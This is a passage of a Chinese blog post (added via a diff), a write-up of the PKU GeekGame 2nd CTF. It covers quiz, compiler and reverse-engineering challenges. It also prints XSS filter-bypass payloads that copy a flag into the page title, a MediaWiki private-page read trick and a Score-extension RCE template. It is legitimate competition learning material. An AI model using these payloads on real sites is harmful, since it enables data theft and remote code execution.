@@ -1,0 +1,887 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jog">
+  <link rel="icon" href="/img/avatar.jog">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="allons42">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="第二届北大CTF的解题报告">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PKU GeekGame 2nd Writeup">
+<meta property="og:url" content="https://allons42.github.io/geekgame_2nd/index.html">
+<meta property="og:site_name" content="Hitchhiker&#39;s camp">
+<meta property="og:description" content="第二届北大CTF的解题报告">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://allons42.github.io/img/geek2/0.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek2//1.jpg">
+<meta property="og:image" content="https://allons42.github.io/img/geek2/2.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek2/3.png">
+<meta property="article:published_time" content="2022-11-26T15:00:00.000Z">
+<meta property="article:modified_time" content="2024-05-28T07:46:08.664Z">
+<meta property="article:author" content="allons42">
+<meta property="article:tag" content="Tech">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allons42.github.io/img/geek2/0.png">
+  
+  
+  
+  <title>PKU GeekGame 2nd Writeup - Hitchhiker&#39;s camp</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"allons42.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>allons42</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PKU GeekGame 2nd Writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-26 23:00" pubdate>
+          2022年11月26日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PKU GeekGame 2nd Writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>第二届北京大学信息安全综合能力竞赛（PKU
+GeekGame）的writeup，题目及官方题解：<a
+target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-2nd">geekgame-2nd</a>。可惜最近太忙了，wish
+I have more time!</p>
+<figure>
+<img src="/img/geek2/0.png" srcset="/img/loading.gif" lazyload
+alt="上次是Misc选手，这次是Algorithm选手，下次争做web选手 :)" />
+<figcaption
+aria-hidden="true">上次是Misc选手，这次是Algorithm选手，下次争做web选手
+:)</figcaption>
+</figure>
+<h2 id="签到">签到</h2>
+<p>和上届完全一样，不确定是不是wingdings字体，总之复制到 txt
+就变成了正常字符。得到两行字符，轮流读取得到flag。</p>
+<h2 id="小北问答极速版">小北问答·极速版</h2>
+<p>反复刷题，发现题库总共8道题，每次随机选7道。把题库扒出来：</p>
+<ol type="1">
+<li><blockquote>
+<p>在第一届 PKU GeekGame 比赛的题目《电子游戏概论》中，通过第 N
+级关卡需要多少金钱？</p>
+</blockquote>
+<p>从<a
+target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-1st">geekgame-1st</a>的writeup里可以找到第1关400分，第15关5900分。第16关6700分。假设所有关卡分数都是100的整数倍，且每次新增的分数保持不降，经过几轮试错可以算出1~15关的所有分数。</p></li>
+<li><blockquote>
+<p>支持 WebP 图片格式的最早 Firefox 版本是多少？</p>
+</blockquote>
+<p>65，百度搜出来百度百科就有，谷歌还要往下翻好几条，百度赢麻了。</p></li>
+<li><blockquote>
+<p>视频 bilibili.com/video/BV1EV411s7vu 也可以通过
+bilibili.com/video/av_____ 访问。下划线内应填什么数字？</p>
+</blockquote>
+<p>用b站视频数据的接口查询av号：https://api.bilibili.com/x/web-interface/archive/stat?bvid=BV1EV411s7vu</p></li>
+<li><blockquote>
+<p>北京大学某实验室曾开发了一个叫 gStore
+的数据库软件。最早描述该软件的论文的 DOI 编号是多少？</p>
+</blockquote>
+<p>从官网：<a
+target="_blank" rel="noopener" href="http://www.gstore.cn/pcsite/index.html#/regarding">关于我们</a>找到最早发表在VLDB
+2011上，根据名字和会议很容易查到。</p></li>
+<li><blockquote>
+<p>每个 Android 软件都有唯一的包名。北京大学课外锻炼使用的最新版 PKU
+Runner 软件的包名是什么？</p>
+</blockquote>
+<p>下载下来在文件管理系统里找到：</p>
+<p><img src="/img/geek2//1.jpg" srcset="/img/loading.gif" lazyload /></p></li>
+<li><blockquote>
+<p>访问网址 “http://ctf.世界一流大学.com” 时，向该主机发送的 HTTP 请求中
+Host 请求头的值是什么？</p>
+</blockquote>
+<p>浏览器监测一下网络流量，可以看到发出的请求是<code>GET  http://ctf.xn--4gqwbu44czhc7w9a66k.com/</code>，事实上<code>xn--</code>是将非ascii字符域名转化为标准域名的方式。</p></li>
+<li><blockquote>
+<p>我刚刚在脑海中想了一个介于 9835337619 到 9835337778
+之间的质数。猜猜它是多少？</p>
+</blockquote>
+<p>每次做题遇到的起止点都会变，且其中恰有8个质数。尝试记录每次猜答案的对错，但几乎遇不到相同的题目，不确定相同的题目答案是否相同，只能靠猜了。</p></li>
+<li><blockquote>
+<p>我有一个朋友在美国，他无线路由器的 MAC 地址是
+d2:94:35:21:42:43。请问他所在地的邮编是多少？</p>
+</blockquote>
+<p>查不到MAC地址，送命题，没得做，过。</p></li>
+</ol>
+<p>这里前6题可以保证正确，第7题只有1/8的概率猜对，第8题没得做，但是我们只需要答对随机选出的7道题，放个脚本反复刷题总是有概率全对的。一个小坑是每次做完题最好多尝试几次接收信息，避免漏掉最后的flag。</p>
+<p>脚本：<a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-2nd/codes/Q%26A.ipynb">Q&amp;A.ipynb</a>。</p>
+<h2 id="编原译理习题课">编原译理习题课</h2>
+<h4 id="flag1让-g-编译出的程序超过-8mb">flag1：让 g++ 编译出的程序超过
+8MB</h4>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123; <br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> padding[<span class="hljs-number">4096</span> * <span class="hljs-number">4096</span>] = &#123;<span class="hljs-number">1</span>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>只需要一个非常大的初始化……</p>
+<h4 id="flag2让-g-输出的报错信息超过-2mb">flag2：让 g++
+输出的报错信息超过 2MB</h4>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> a string(1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> b a;a;a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> c b;b;b</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> d c;c;c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> e d;d;d</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;e;e;e&#125;<br></code></pre></td></tr></table></figure>
+<p>发现int转string会有大段报错，所以只需要执行足够多次就够了。没有仔细研究，应该有更好的方法。</p>
+<h4 id="flag3让-g-因为段错误而崩溃">flag3：让 g++ 因为段错误而崩溃</h4>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// https://gcc.gnu.org/bugzilla/show_bug.cgi?id=105289</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">value_type</span>;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Y, Y...&gt; <span class="hljs-keyword">typename</span> XList, <span class="hljs-keyword">typename</span> T2, T2... Vs&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">value_type</span>&lt;XList&lt;T2, Vs...&gt;&gt;<br>&#123;<br>    <span class="hljs-keyword">using</span> type = T2;<br>&#125;;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> List, <span class="hljs-keyword">typename</span> value_type&lt;List&gt;::type Element&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">push_front_vlist</span>;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> X, X...&gt; <span class="hljs-keyword">typename</span> XList, <span class="hljs-keyword">typename</span> T, T Arg, T... Vs&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">push_front_vlist</span>&lt;XList&lt;T, Vs...&gt;, Arg&gt;<br>&#123;<br>    <span class="hljs-keyword">using</span> type = XList&lt;T, Arg, Vs...&gt;;<br>&#125;;<br></code></pre></td></tr></table></figure>
+<p>在GCC官方的bug tracker里找ICE（internal compiler
+error）漏洞报告，重点要找符合g++11版本的。</p>
+<h2 id="flag-checker">Flag Checker</h2>
+<p>需要解析一个jar包，这里用的是Ghidra。Flag1的关键代码在GeekGame.class的actionPerformed函数里，对输入字符串Base64编码后做rot13，按代码复现一遍即可。</p>
+<p>Flag2的关键代码在GeekGame.class的初始化函数里，看起来就很可疑的大段字符串处理后是一个函数定义：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">function <span class="hljs-title function_">checkflag2</span><span class="hljs-params">(_0xa83ex2)</span>&#123;<span class="hljs-keyword">var</span> _0x724b=[<span class="hljs-string">&#x27;charCodeAt&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;split&#x27;</span>,<span class="hljs-string">&#x27;stringify&#x27;</span>,<span class="hljs-string">&#x27;Correct&#x27;</span>,<span class="hljs-string">&#x27;Wrong&#x27;</span>,<span class="hljs-string">&#x27;j-&#x27;</span>];<span class="hljs-keyword">return</span> (JSON[_0x724b[<span class="hljs-number">4</span>]](_0xa83ex2[_0x724b[<span class="hljs-number">3</span>]](_0x724b[<span class="hljs-number">2</span>])[_0x724b[<span class="hljs-number">1</span>]](function(_0xa83ex3)&#123;<span class="hljs-keyword">return</span> _0xa83ex3[_0x724b[<span class="hljs-number">0</span>]](<span class="hljs-number">0</span>)&#125;))== JSON[_0x724b[<span class="hljs-number">4</span>]]([<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">30</span>,<span class="hljs-number">105</span>,<span class="hljs-number">16</span>,<span class="hljs-number">31</span>,<span class="hljs-number">16</span>,<span class="hljs-number">67</span>,<span class="hljs-number">3</span>,<span class="hljs-number">33</span>,<span class="hljs-number">5</span>,<span class="hljs-number">60</span>,<span class="hljs-number">4</span>,<span class="hljs-number">106</span>,<span class="hljs-number">6</span>,<span class="hljs-number">41</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">67</span>,<span class="hljs-number">3</span>,<span class="hljs-number">16</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">33</span>,<span class="hljs-number">232</span>][_0x724b[<span class="hljs-number">1</span>]](function(_0xa83ex3)&#123;<span class="hljs-keyword">return</span> (checkflag2+ _0x724b[<span class="hljs-number">2</span>])[_0x724b[<span class="hljs-number">0</span>]](_0xa83ex3)&#125;))?_0x724b[<span class="hljs-number">5</span>]:_0x724b[<span class="hljs-number">6</span>])&#125;<br></code></pre></td></tr></table></figure>
+<p>是一个以自身作为参数的函数，翻译成伪代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">seq = [<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">30</span>,<span class="hljs-number">105</span>,<span class="hljs-number">16</span>,<span class="hljs-number">31</span>,<span class="hljs-number">16</span>,<span class="hljs-number">67</span>,<span class="hljs-number">3</span>,<span class="hljs-number">33</span>,<span class="hljs-number">5</span>,<span class="hljs-number">60</span>,<span class="hljs-number">4</span>,<span class="hljs-number">106</span>,<span class="hljs-number">6</span>,<span class="hljs-number">41</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">67</span>,<span class="hljs-number">3</span>,<span class="hljs-number">16</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">33</span>,<span class="hljs-number">232</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mapping</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> (checkflag2+<span class="hljs-string">&quot;&quot;</span>).charCodeAt(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkflag2</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> JSON.stringfy(s.split(<span class="hljs-string">&quot;&quot;</span>).<span class="hljs-built_in">map</span>(charCodeAt(<span class="hljs-number">0</span>)) <br>                         == JSON.stringfy(seq.<span class="hljs-built_in">map</span>(mapping)) ? <span class="hljs-string">&#x27;Correct&#x27;</span>: <span class="hljs-string">&#x27;Wrong&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>即要求按照seq的顺序提取checkflag2自身相应位置的字符，得到<code>flag&#123;javascript-obfuscator&#125;</code>。</p>
+<p>代码：<a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-2nd/codes/FlagChecker.ipynb">FlagChecker.ipynb</a>。</p>
+<h2 id="给钱不要">给钱不要！</h2>
+<p>目标网站的漏洞很明显，是把输入的字符串直接用作跳转网址了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">go</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    location.<span class="hljs-property">href</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;filename&#x27;</span>).<span class="hljs-property">value</span> + <span class="hljs-string">&#x27;.jpg&#x27;</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>这是一个常见的xss漏洞，正常情况下href是跳转到当前网址的子页面，即<code>http://host.com/current_page/href</code>，但其开头是<code>http://</code>，<code>//</code>
+或 <code>javascript:</code>
+时，就会从当前网站直接跳出去，或直接执行相应的js命令。</p>
+<p>这道题中，受害者（<code>prob06-xssbot.py</code>）的行为逻辑是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. 检查异常字符</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">all</span>(<span class="hljs-number">0x20</span>&lt;=<span class="hljs-built_in">ord</span>(c)&lt;=<span class="hljs-number">0x7e</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> text) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(text)&lt;=<span class="hljs-number">4000</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> text<br><br><span class="hljs-comment"># 2. 用chrome://omnibox检查输入字符串类型</span><br><span class="hljs-comment"># 移除开头的网络协议[&#x27;http://&#x27;, &#x27;https://&#x27;, &#x27;file://&#x27;]，然后根据omnibox的类型判断定义安全度</span><br><span class="hljs-comment"># &#x27;query&#x27;: very_safe, &#x27;unknown&#x27;: safe, other: dangerous</span><br><br><span class="hljs-comment"># 3. 将flag2放在网页中，然后在网页上输入我们的代码，输出网页的title</span><br><span class="hljs-comment"># 4. 若输入是very_safe且title为特定字符串，则输出flag1</span><br></code></pre></td></tr></table></figure>
+<h4 id="flag1">flag1</h4>
+<p>需要欺骗omnibox输入是query类型，但实际上是一个网址，从而跳转到任意网页（例如我们自己的服务器）让bot看到指定的标题。乍一看非常困难，相当于在chrome中输入真实网址不会自动跳转，而是被识别为query进入谷歌搜索，很难相信chrome会有这种漏洞，因此问题很可能出在bot自作主张移除网络协议的这一步。</p>
+<p>一个标准的网址格式是<code>scheme://username:password@host:port/path?query#fragment</code>，这些符号都有特定的含义，不太可能通过混淆让chorme分段出错。具体分析omnibox解析输入的<a
+target="_blank" rel="noopener" href="https://blog.csdn.net/xingtian713/article/details/4516738">代码逻辑</a>和<a
+target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src/+/refs/tags/106.0.5249.163/components/omnibox/browser/autocomplete_input.cc#235">关键源码</a>，发现关键在于”用户没有输入scheme时，需要分辨URL和query“。所以目标是输入<code>http://</code>时能作为URL，但去掉之后能逃脱这段检查：</p>
+<ol type="1">
+<li>username包含空格，则判定为unknown：e.g.
+<code>a a@baidu.com</code></li>
+<li>host为ipv4地址，1 &lt; num_ipv4_components &lt; 4
+且结尾没有slash，则判定为query：e.g.
+<code>0xa2.0x69.0x101d:port</code></li>
+</ol>
+<p>由于实际输入是构造的地址加上<code>.jpg</code>，为了回避slash构造出如下payload：<code>http://0xa2.0x69.0x101d:9811?</code>，在自己的服务器上搭建一个简易flask，title写成目标字符串，拿到flag1。</p>
+<h4 id="flag2">flag2</h4>
+<p>只有将flag从网页中转移到标题上才能拿到，因此需要注入javascript代码，且不被omnibox识破。在JavaScript单词中间插入一个"就可以骗过omnibox，可惜这道题限制了可用字符，只能在代码上做文章。源码中对js的判断非常简单，只要符合正则<code>(?i)javascript:([^;=().\"]*)</code>就不判为URL。代码中不包含特殊字符可以用eval+unicode或者JSF**k来处理，但不包含小括号比较麻烦，需要用匿名函数+反引号处理，payload如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 原始payload</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span>=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.flag&#x27;</span>).<span class="hljs-property">textContent</span><br><span class="hljs-comment">// 匿名函数结构，用反引号传参</span><br><span class="hljs-title class_">Function</span><span class="hljs-string">`a<span class="hljs-subst">$&#123; payload &#125;</span>`</span> <span class="hljs-string">``</span><br><span class="hljs-comment">// 实际payload，对代码进行base64编码，结尾的注释符用于过滤bot加上的.jpg后缀</span><br><span class="hljs-title class_">Function</span><span class="hljs-string">`a<span class="hljs-subst">$&#123;atob<span class="hljs-string">`ZG9jdW1lbnQudGl0bGU9ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmZsYWcnKS50ZXh0Q29udGVudDsg`</span>&#125;</span>`</span><span class="hljs-string">``</span> <span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
+<p>代码：<a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-2nd/codes/xss.ipynb">xss.ipynb</a>。记录一些好用的资料：</p>
+<p><a
+target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwNTgyODU3NQ==&amp;mid=2651068626&amp;idx=1&amp;sn=fa9cde874e72f7a32eb40028e2b836b9&amp;chksm=80e60262b7918b74bc5e96023e62860b31b5859cc4474aaccb00aa8660c27e97a6da2ccaecae&amp;scene=21#wechat_redirect">强防御下的XSS绕过思路（一）</a>、<a
+target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwNTgyODU3NQ==&amp;mid=2651073035&amp;idx=1&amp;sn=ef1a8238c0d9cca1fecc296cc83b7704&amp;chksm=80e630bbb791b9ad9b566e4f8e72026858d19c1d46736baafe582117a4e209f3d44dfc714ad1&amp;scene=21#wechat_redirect">（二）</a>、<a
+target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwNTgyODU3NQ==&amp;mid=2651074569&amp;idx=1&amp;sn=d26b984454cb8d8b7f89bc8b9d97e208&amp;chksm=80e62ab9b791a3af3cbbb1ef123a88bdd1f28ae11531a2fcadec1b33b66cf215244086aa6f46&amp;scene=21#wechat_redirect">（三）</a>、<a
+target="_blank" rel="noopener" href="https://cn-sec.com/archives/225803.html">（四）</a></p>
+<p><img src="/img/geek2/2.png" srcset="/img/loading.gif" lazyload /></p>
+<h2 id="私有笔记">私有笔记</h2>
+<p>攻击目标是MediaWiki，搜索MediaWiki相关的安全漏洞，发现2021年12月的<a
+target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/2021-12_security_release/FAQ">版本更新</a>提到了一系列无权限任意访问的漏洞，和首页查到的版本号刚好一致。说明里明确提到了<code>action=rollback&amp;from=&#123;&#123;:private page&#125;&#125;</code>这种攻击方式。首页提示了flag的页面名是<code>Flag</code>，替换到payload里即可获取Flag页面的内容，拿到flag1。</p>
+<p>flag2的提示是尝试RCE，二阶段提示了漏洞来源是Score扩展。查到了<a
+target="_blank" rel="noopener" href="https://github.com/seqred-s-a/cve-2020-29007">CVE-2020-29007</a>和官方的<a
+target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T257062">讨论串</a>，尝试并简化后，获得RCE的执行模板：</p>
+<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bnf"><span class="hljs-attribute">&lt;score&gt;</span>\new Staff <span class="hljs-attribute">&lt;&lt;&#123;c^# </span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">[scheme code goes here] </span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">&#125;&gt;</span>&gt;<span class="hljs-attribute">&lt;/score&gt;</span><br></code></pre></td></tr></table></figure>
+<p>这里用的是scheme语言，根据<a
